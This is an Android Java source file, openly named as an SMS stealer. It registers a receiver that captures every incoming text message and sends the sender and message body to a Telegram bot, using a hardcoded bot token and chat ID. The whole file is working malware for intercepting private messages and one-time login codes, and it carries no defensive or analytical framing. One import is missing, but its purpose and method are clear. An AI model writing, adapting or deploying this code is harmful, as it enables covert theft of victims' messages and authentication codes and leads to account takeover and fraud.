package com.sms.stealer;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SmsReceiver extends BroadcastReceiver {
    private final String BOT_TOKEN = "9235961136:AAEF8tmuu4XYIDvT_Pp_WFUXEyCrqawhhoM";
    private final String CHAT_ID = "8522184173";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = sms.getDisplayOriginatingAddress();
                        String message = sms.getMessageBody();
                        sendToTelegram("📩 SMS от " + sender + ":\n" + message);
                    }
                }
            }
        }
    }

    private void sendToTelegram(final String text) {
        new Thread(new Runnable() {
            public void run() {
                try {
                    String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8");
                    URL url = new URL(urlStr);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.getResponseCode();
                } catch (Exception e) {}
            }
        }).start();
    }
}
